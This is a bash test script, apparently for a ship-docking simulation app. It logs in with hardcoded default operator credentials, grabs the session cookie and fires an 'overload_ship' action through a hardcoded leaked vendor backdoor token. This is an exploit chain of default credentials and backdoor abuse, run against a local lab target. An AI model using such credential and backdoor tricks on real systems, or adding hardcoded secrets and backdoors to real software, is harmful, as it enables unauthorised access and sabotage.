#!/usr/bin/env bash
# One-shot overload test. Logs in with the default operator creds, picks
# the first docked ship, and fires the vendor-backdoor overload action
# against it. Usage:
#   ./scripts/test-overload.sh                       # default: +30 against 127.0.0.1:18090
#   ./scripts/test-overload.sh 50                    # custom count
#   ./scripts/test-overload.sh 50 http://host:18090  # custom count + target
set -euo pipefail

COUNT="${1:-30}"
BASE="${2:-http://127.0.0.1:18090}"
USER="${PORT_OPERATOR_USERNAME:-operator}"
PASS="${PORT_OPERATOR_PASSWORD:-Cool2Pass}"
TOKEN="PORT-SVC-9c2f4e1a-LEGACY"

echo "target : $BASE"
echo "creds  : $USER / $PASS"
echo "count  : +$COUNT past capacity"

# 1. Login — capture the session cookie value from Set-Cookie. We can't use
#    curl's cookie jar because the cookie is set Secure=true and we're on http.
SESS=$(curl -sk -X POST "$BASE/login" \
  --data-urlencode "username=$USER" \
  --data-urlencode "password=$PASS" \
  -D - -o /dev/null \
  | sed -n 's/^Set-Cookie: port_session=\([^;]*\).*/\1/p' | tr -d '\r')

if [ -z "$SESS" ]; then
  echo "ERROR: login failed — no session cookie returned" >&2
  exit 1
fi
echo "session: ${SESS:0:24}…"

# 2. Find a docked ship
SHIP=$(curl -s -H "Cookie: port_session=$SESS" "$BASE/api/state" \
  | python3 -c "import sys,json; s=json.load(sys.stdin); print(next((x['id'] for x in s['ships'] if x['status'] in ('docking','working')),''))")

if [ -z "$SHIP" ]; then
  echo "ERROR: no ships are docked or working — wait for one to arrive and retry" >&2
  exit 2
fi
echo "ship   : $SHIP"

# 3. Fire the overload via the leaked vendor token
echo
echo "── overload response ──"
curl -s -X POST "$BASE/api/svc/exec" \
  -H "X-Service-Token: $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"action\":\"overload_ship\",\"ship_id\":\"$SHIP\",\"count\":$COUNT,\"actor\":\"test-overload\"}"
echo
